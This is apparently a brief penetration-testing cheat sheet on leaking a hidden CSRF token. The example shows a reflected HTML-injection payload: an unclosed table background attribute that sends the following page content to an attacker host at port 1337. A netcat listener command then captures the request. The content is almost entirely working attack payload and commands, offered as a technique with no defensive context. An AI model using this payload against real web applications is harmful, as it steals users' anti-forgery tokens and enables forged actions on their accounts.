# Cross-Site Request Forgery (POST-based)
***

### Example:
#### For instance a web application where we the input it's reflected on the page and the csrf is hidden like the following:
```html
"><h1>h1<u>underline</u></h1></div><input name="csrf" type="hidden" value="8004b0075be876276ad2dbf443f7aaae99d7a123" meta-dev='
```
#### Leaking the target's CSRF remotely via XSS/HTML injection (below it's an example of an HTML injection):
```html
<table%20background='%2f%2f<VPN/TUN IP>:1337%2f
```

#### Then we would be listening for the request using netcat
```bash
$ nc -nlvp 1337
```
